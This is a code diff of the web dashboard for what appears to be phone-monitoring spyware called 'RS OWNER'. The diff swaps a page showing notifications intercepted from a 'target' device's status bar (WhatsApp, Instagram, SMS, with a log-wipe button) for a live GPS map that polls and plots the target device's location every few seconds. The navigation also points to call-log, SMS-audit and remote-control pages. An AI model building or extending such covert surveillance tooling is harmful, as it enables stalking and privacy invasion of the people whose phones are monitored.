@@ -3,8 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Live Notifications - RS OWNER</title>
+    <title>Live GPS Tracking - RS OWNER</title>
     <script src="https://unpkg.com/lucide@latest"></script>
+    <!-- Leaflet.js Mapping Infrastructure Components Layer -->
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     <style>
         /* =========================================================
            RS PHONE - ZERO-LAG FLAT ARCHITECTURE (INJECTED STYLE)
@@ -15,11 +18,8 @@
             --text-main: #ffffff;
             --text-muted: #aaaaaa;
             --accent-cyan: #00f0ff;
-            --color-red: #ff3b30;
-            --color-green: #2ecc71;
-            --color-pink: #e91e63;
-            --color-dark: #2c3e50;
             --color-blue: #3498db;
+            --color-green: #2ecc71;
         }
 
         * {
@@ -35,98 +35,38 @@
             color: var(--text-main);
             min-height: 100vh;
             padding: 15px;
-            padding-bottom: 40px;
             overflow-x: hidden;
         }
 
-        /* Custom Scrollbar */
-        ::-webkit-scrollbar { width: 6px; height: 6px; }
-        ::-webkit-scrollbar-track { background: var(--bg-main); }
-        ::-webkit-scrollbar-thumb { background: #333; border-radius: 10px; }
-        ::-webkit-scrollbar-thumb:hover { background: var(--accent-cyan); }
-
-        /* Sidebar & Layout */
         .app-container { display: flex; min-height: 100vh; gap: 20px; }
         .sidebar { width: 260px; background: var(--bg-card); padding: 20px; border-radius: 16px; border: 1px solid #2c2c2e; display: flex; flex-direction: column; gap: 25px; }
-        .sidebar-brand { display: flex; align-items: center; gap: 10px; font-size: 18px; font-weight: 800; letter-spacing: 1px; color: var(--text-main); }
+        .sidebar-brand { display: flex; align-items: center; gap: 10px; font-size: 18px; font-weight: 800; letter-spacing: 1px; }
         .sidebar-menu { list-style: none; display: flex; flex-direction: column; gap: 8px; }
         .sidebar-menu li a { display: flex; align-items: center; gap: 12px; padding: 12px 16px; color: var(--text-muted); text-decoration: none; border-radius: 8px; font-weight: 600; font-size: 14px; transition: all 0.2s; }
         .sidebar-menu li.active a, .sidebar-menu li a:hover { background: rgba(0, 240, 255, 0.08); color: var(--accent-cyan); }
         
         .main-content { flex: 1; display: flex; flex-direction: column; gap: 20px; }
         .topbar { display: flex; justify-content: space-between; align-items: center; padding-bottom: 15px; border-bottom: 1px solid #2c2c2e; }
-        .glass-panel { background: var(--bg-card); border: 1px solid #2c2c2e; border-radius: 16px; padding: 25px; }
+        .glass-panel { background: var(--bg-card); border: 1px solid #2c2c2e; border-radius: 16px; padding: 25px; height: 75vh; display: flex; flex-direction: column; gap: 15px; }
 
-        /* =========================================
-           NOTIFICATION SPECIFIC UI (APP FILTERS)
-           ========================================= */
-        .wipe-btn { 
-            background: rgba(255, 59, 48, 0.1); 
-            color: var(--color-red); 
-            border: 1px solid var(--color-red); 
-            border-radius: 6px; 
-            padding: 8px 16px; 
-            cursor: pointer; 
-            font-weight: bold; 
-            display: flex; 
-            align-items: center; 
-            gap: 6px; 
-            transition: 0.2s; 
-            font-size: 13px;
-            text-transform: uppercase;
+        /* =========================================================
+           GEOLOCATION MAP SPLIT ARCHITECTURE
+           ========================================================= */
+        .telemetry-bar {
+            display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px;
         }
-        .wipe-btn:hover { background: var(--color-red); color: white; }
+        .metric-pill {
+            background: rgba(255,255,255,0.02); border: 1px solid #2c2c2e;
+            padding: 12px 16px; border-radius: 8px; display: flex; flex-direction: column; gap: 4px;
+        }
+        .metric-label { font-size: 0.75rem; color: var(--text-muted); font-weight: bold; text-transform: uppercase; }
+        .metric-value { font-size: 1rem; font-weight: 700; color: #fff; font-family: monospace; }
 
-        /* The Horizontal App Filter Engine */
-        .filter-bar {
-            display: flex; gap: 12px; overflow-x: auto; padding-bottom: 15px; margin-bottom: 20px;
-            scrollbar-width: none;
-            border-bottom: 1px solid rgba(255,255,255,0.05);
+        /* Map Canvas */
+        #map-viewport {
+            flex: 1; width: 100%; border-radius: 10px; border: 1px solid #333;
+            background: #151515; z-index: 1;
         }
-        .filter-bar::-webkit-scrollbar { display: none; }
-        
-        .filter-pill {
-            display: flex; align-items: center; gap: 8px; padding: 10px 18px;
-            background: rgba(255,255,255,0.03); border: 1px solid #333; border-radius: 20px;
-            color: var(--text-muted); font-size: 13px; font-weight: 700;
-            cursor: pointer; white-space: nowrap; transition: all 0.2s;
-            text-transform: uppercase; letter-spacing: 0.5px;
-        }
-        .filter-pill:hover { background: rgba(255,255,255,0.08); }
-        .filter-pill:active { transform: scale(0.95); }
-        
-        /* Active State Colors */
-        .filter-pill.active { background: var(--color-blue); color: white; border-color: var(--color-blue); }
-        .filter-pill.active[data-filter="whatsapp"] { background: rgba(46, 204, 113, 0.2); color: var(--color-green); border-color: var(--color-green); }
-        .filter-pill.active[data-filter="instagram"] { background: rgba(233, 30, 99, 0.2); color: var(--color-pink); border-color: var(--color-pink); }
-        .filter-pill.active[data-filter="system"] { background: rgba(255, 255, 255, 0.1); color: #fff; border-color: #666; }
-
-        /* Clean Feed Container */
-        .data-list-container { 
-            display: flex; flex-direction: column; gap: 12px; 
-            max-height: 65vh; overflow-y: auto; padding-right: 10px; 
-        }
-
-        .notif-card {
-            background: rgba(255,255,255,0.02); 
-            padding: 16px 20px; 
-            border-radius: 12px; 
-            border-left: 4px solid var(--color-blue); 
-            border-top: 1px solid rgba(255,255,255,0.05);
-            border-right: 1px solid rgba(255,255,255,0.05);
-            border-bottom: 1px solid rgba(255,255,255,0.05);
-            transition: transform 0.2s, background 0.2s;
-        }
-        .notif-card:hover { transform: translateX(4px); background: rgba(255,255,255,0.04); }
-        .notif-card[data-app="whatsapp"] { border-left-color: var(--color-green); }
-        .notif-card[data-app="instagram"] { border-left-color: var(--color-pink); }
-        .notif-card[data-app="system"] { border-left-color: #666; }
-        
-        .notif-header { display: flex; justify-content: space-between; margin-bottom: 10px; align-items: center; }
-        .notif-app { font-size: 0.85rem; font-weight: 800; text-transform: uppercase; letter-spacing: 1px; }
-        .notif-time { color: #888; font-size: 0.8rem; font-family: monospace; }
-        .notif-title { font-size: 1.05rem; font-weight: 700; margin-bottom: 6px; color: #fff; }
-        .notif-desc { font-size: 0.9rem; color: #bbb; line-height: 1.4; word-break: break-word; }
     </style>
 </head>
 <body>
@@ -139,10 +79,9 @@
             </div>
             <ul class="sidebar-menu">
                 <li><a href="/dashboard"><i data-lucide="layout-dashboard"></i> Overview</a></li>
-                <li class="active"><a href="/communication.html"><i data-lucide="message-circle"></i> Comm Hub</a></li>
-                <li><a href="/remote_center.html"><i data-lucide="cpu"></i> Remote Ops</a></li>
-                <li><a href="/calls"><i data-lucide="phone"></i> Call Logs</a></li>
-                <li><a href="/messages"><i data-lucide="message-square"></i> SMS Audit</a></li>
+                <li><a href="/safety"><i data-lucide="shield-alert"></i> Safety Hub</a></li>
+                <li class="active"><a href="/locations"><i data-lucide="map-pin"></i> Live Tracking</a></li>
+                <li><a href="/geofence-config"><i data-lucide="locate"></i> Geofencing</a></li>
                 <li><a href="/files"><i data-lucide="folder-open"></i> Storage</a></li>
             </ul>
         </div>
@@ -151,82 +90,64 @@
         <main class="main-content">
             <header class="topbar">
                 <div>
-                    <h2 style="font-weight: 800; letter-spacing: 1px; text-transform: uppercase;">Live Notification Stream</h2>
-                    <p style="color: #666; font-size: 0.85rem; margin-top: 4px;">Intercepting active pushes from the target status bar.</p>
+                    <h2 style="font-weight: 800; letter-spacing: 1px; text-transform: uppercase;">Live GPS Radar</h2>
+                    <p style="color: #666; font-size: 0.85rem; margin-top: 4px;">Continuous telemetry stream tracking current geospatial vectors.</p>
                 </div>
-                <div class="device-switcher" style="display: flex; align-items: center; gap: 15px;">
-                    <select id="device-select" style="padding: 10px 14px; border-radius: 6px; background: #1a1a1c; color: white; border: 1px solid #333; outline: none; font-weight: 600; cursor: pointer;"></select>
-                    
-                    <button onclick="wipeNotificationsHistory()" class="wipe-btn">
-                        <i data-lucide="trash-2" style="width: 14px; height: 14px;"></i> Wipe Log
-                    </button>
-                </div>
+                <select id="device-select" style="padding: 10px 14px; border-radius: 6px; background: #1a1a1c; color: white; border: 1px solid #333; cursor: pointer; font-weight: 600;"></select>
             </header>
 
             <div class="glass-panel">
-                <!-- PRO APP FILTER BAR -->
-                <div class="filter-bar" id="app-filter-bar">
-                    <div class="filter-pill active" data-filter="all">
-                        <i data-lucide="layout-grid"></i> All Alerts
+                <!-- TELEMETRY COUNTERS -->
+                <div class="telemetry-bar">
+                    <div class="metric-pill">
+                        <span class="metric-label">Latitude Vector</span>
+                        <span class="metric-value" id="geo-lat">0.000000</span>
                     </div>
-                    <div class="filter-pill" data-filter="whatsapp">
-                        <i data-lucide="message-circle"></i> WhatsApp
+                    <div class="metric-pill">
+                        <span class="metric-label">Longitude Vector</span>
+                        <span class="metric-value" id="geo-lng">0.000000</span>
                     </div>
-                    <div class="filter-pill" data-filter="instagram">
-                        <i data-lucide="instagram"></i> Instagram
-                    </div>
-                    <div class="filter-pill" data-filter="sms">
-                        <i data-lucide="message-square"></i> SMS
-                    </div>
-                    <div class="filter-pill" data-filter="system">
-                        <i data-lucide="settings"></i> System
+                    <div class="metric-pill">
+                        <span class="metric-label">Last Transmission</span>
+                        <span class="metric-value" id="geo-time">NEVER</span>
                     </div>
                 </div>
 
-                <!-- DATA FEED CONTAINER -->
-                <div class="data-list-container" id="dashboard-notif-feed">
-                    <div style="text-align: center; color: #888; padding: 40px; font-weight: bold; letter-spacing: 1px;">
-                        <i data-lucide="loader" class="lucide-spin" style="width: 30px; height: 30px; margin-bottom: 10px;"></i><br>
-                        FETCHING ENCRYPTED NOTIFICATIONS...
-                    </div>
-                </div>
+                <!-- DYNAMIC MAP DECK -->
+                <div id="map-viewport"></div>
             </div>
         </main>
     </div>
-    
-    <!-- EMBEDDED JAVASCRIPT LOGIC -->
+
     <script>
-        class NotificationsEngine {
+        class GeolocationEngine {
             constructor() {
                 this.activeDeviceId = localStorage.getItem('active_device_id');
-                this.allData = [];
-                this.currentFilter = 'all'; // Default active filter state
+                this.map = null;
+                this.marker = null;
                 this.init();
             }
 
             async init() {
-                this.setupFilters();
+                this.initMapFrame();
                 await this.loadDevicesList();
                 if (!this.activeDeviceId) return;
                 
-                this.fetchNotifications();
-                setInterval(() => this.fetchNotifications(), 5000);
+                this.fetchLocation();
+                setInterval(() => this.fetchLocation(), 7000); // 7s Loop stream mapping context
             }
 
-            // 🚀 INJECTED: Interactive Filter Linking Logic
-            setupFilters() {
-                const pills = document.querySelectorAll('.filter-pill');
-                pills.forEach(pill => {
-                    pill.addEventListener('click', (e) => {
-                        pills.forEach(p => p.classList.remove('active'));
-                        e.currentTarget.classList.add('active');
-                        this.currentFilter = e.currentTarget.getAttribute('data-filter');
-                        this.renderNotifications(); // Re-render instantly from memory cache
-                    });
-                });
+            initMapFrame() {
+                // Initialize default map point targeting center variables
+                this.map = L.map('map-viewport').setView([20.5937, 78.9629], 5);
+                
+                // Dark Matter Map Tiles Injection Logic
+                L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
+                    maxZoom: 19,
+                    attribution: 'RS Security Core Infrastructure'
+                }).addTo(this.map);
             }
 
-            // 🚀 INJECTED: Device Loading Logic
             async loadDevicesList() {
                 const token = localStorage.getItem('owner_token');
                 try {
@@ -236,10 +157,6 @@
                         const selectEl = document.getElementById('device-select');
                         if (selectEl) {
                             selectEl.innerHTML = ''; 
-                            if (!result.data || result.data.length === 0) {
-                                selectEl.innerHTML = '<option value="">No Devices Found</option>';
-                                return;
-                            }
                             result.data.forEach(dev => {
                                 const option = document.createElement('option');
                                 option.value = dev.id;
@@ -252,116 +169,54 @@
                                 localStorage.setItem('active_device_id', this.activeDeviceId);
                             }
                             selectEl.value = this.activeDeviceId;
-
                             selectEl.addEventListener('change', (e) => {
                                 this.activeDeviceId = e.target.value;
                                 localStorage.setItem('active_device_id', this.activeDeviceId);
-                                document.getElementById('dashboard-notif-feed').innerHTML = '<div style="text-align: center; color: #888; padding: 40px;">SCANNING NEW TARGET NODE...</div>';
-                                this.fetchNotifications(); 
+                                this.fetchLocation(); 
                             });
                         }
                     }
-                } catch (e) { console.error("Failed to load device list:", e); }
+                } catch (e) { console.error("Device sync block execution broken:", e); }
             }
 
-            async fetchNotifications() {
+            async fetchLocation() {
                 const token = localStorage.getItem('owner_token');
                 if (!this.activeDeviceId) return;
 
                 try {
-                    const res = await fetch(`/api/notifications?device_id=${this.activeDeviceId}&limit=100`, {
+                    const res = await fetch(`/api/locations?device_id=${this.activeDeviceId}&limit=1`, {
                         headers: { 'Authorization': `Bearer ${token}` }
                     });
                     const result = await res.json();
-                    if (result.status === 'success') {
-                        this.allData = result.data || [];
-                        this.renderNotifications();
+                    
+                    if (result.status === 'success' && result.data && result.data.length > 0) {
+                        const loc = result.data[0];
+                        this.updateMapTelemetry(loc.latitude, loc.longitude, loc.created_at);
                     }
-                } catch (e) { console.error("Notifications Engine Error:", e); }
+                } catch (e) { console.error("Map Telemetry Fetch Error:", e); }
             }
 
-            // 🚀 SMART ENGINE: Applies Client-Side App Filtering dynamically
-            renderNotifications() {
-                const container = document.getElementById('dashboard-notif-feed');
-                if (!container) return;
+            updateMapTelemetry(lat, lng, timestamp) {
+                document.getElementById('geo-lat').innerText = lat.toFixed(6);
+                document.getElementById('geo-lng').innerText = lng.toFixed(6);
+                document.getElementById('geo-time').innerText = new Date(timestamp).toLocaleTimeString('en-IN');
 
-                // Execute Filter Logic
-                let filteredItems = this.allData;
-                if (this.currentFilter !== 'all') {
-                    filteredItems = this.allData.filter(n => {
-                        const appName = (n.app_name || '').toLowerCase();
-                        if (this.currentFilter === 'whatsapp') return appName.includes('whatsapp');
-                        if (this.currentFilter === 'instagram') return appName.includes('instagram');
-                        if (this.currentFilter === 'sms') return appName.includes('message') || appName.includes('sms');
-                        if (this.currentFilter === 'system') return appName.includes('system') || appName.includes('android');
-                        return false; // For strictly mapped filters
-                    });
+                const targetCoords = [lat, lng];
+
+                if (!this.marker) {
+                    this.marker = L.marker(targetCoords).addTo(this.map);
+                    this.map.setView(targetCoords, 16);
+                } else {
+                    this.marker.setLatLng(targetCoords);
+                    this.map.panTo(targetCoords);
                 }
-
-                if (filteredItems.length === 0) {
-                    container.innerHTML = `
-                        <div style="color: #666; text-align: center; padding: 60px;">
-                            <i data-lucide="bell-off" style="width: 48px; height: 48px; opacity: 0.3; margin-bottom: 10px;"></i><br>
-                            No alerts matching this filter configuration.
-                        </div>`;
-                    if (window.lucide) window.lucide.createIcons();
-                    return;
-                }
-
-                container.innerHTML = filteredItems.map(n => {
-                    const appLower = (n.app_name || '').toLowerCase();
-                    let themeClass = 'other';
-                    let appColor = 'var(--color-blue)';
-                    
-                    if (appLower.includes('whatsapp')) { themeClass = 'whatsapp'; appColor = 'var(--color-green)'; }
-                    else if (appLower.includes('instagram')) { themeClass = 'instagram'; appColor = 'var(--color-pink)'; }
-                    else if (appLower.includes('system') || appLower.includes('android')) { themeClass = 'system'; appColor = '#aaa'; }
-
-                    const dateObj = new Date(n.received_at);
-                    const timeString = dateObj.toLocaleTimeString('en-IN', { hour: '2-digit', minute: '2-digit', hour12: true });
-                    const dateString = dateObj.toLocaleDateString('en-IN', { day: '2-digit', month: 'short' });
-
-                    return `
-                    <div class="notif-card" data-app="${themeClass}">
-                        <div class="notif-header">
-                            <span class="notif-app" style="color: ${appColor};">${n.app_name || 'System Alert'}</span>
-                            <span class="notif-time">${dateString} • ${timeString}</span>
-                        </div>
-                        <div class="notif-title">${n.title || '[Hidden Element]'}</div>
-                        <div class="notif-desc">${n.message || 'Payload intercepted cleanly.'}</div>
-                    </div>
-                    `;
-                }).join('');
+                this.marker.bindPopup(`<b>Target Node</b><br>Lat: ${lat}<br>Lng: ${lng}`).openPopup();
             }
         }
 
-        window.wipeNotificationsHistory = async function() {
-            if(!confirm("CRITICAL WARNING: Permanently wipe all intercepted notification logs from the cloud storage?")) return;
-            const token = localStorage.getItem('owner_token');
-            const activeId = localStorage.getItem('active_device_id');
-            
-            try {
-                const res = await fetch('/api/notifications/clear', {
-                    method: 'POST',
-                    headers: { 'Authorization': `Bearer ${token}`, 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ device_id: activeId })
-                });
-                const result = await res.json();
-                if (result.status === 'success') {
-                    alert("Notification matrix wiped cleanly.");
-                    window.location.reload();
-                } else {
-                    alert("Execution Error: " + result.message);
-                }
-            } catch (e) {
-                console.error(e);
-                alert("Network Gateway timeout.");
-            }
-        };
-
         document.addEventListener('DOMContentLoaded', () => {
-            if (window.lucide) window.lucide.createIcons();
-            new NotificationsEngine();
+            lucide.createIcons();
+            new GeolocationEngine();
         });
     </script>
 </body>
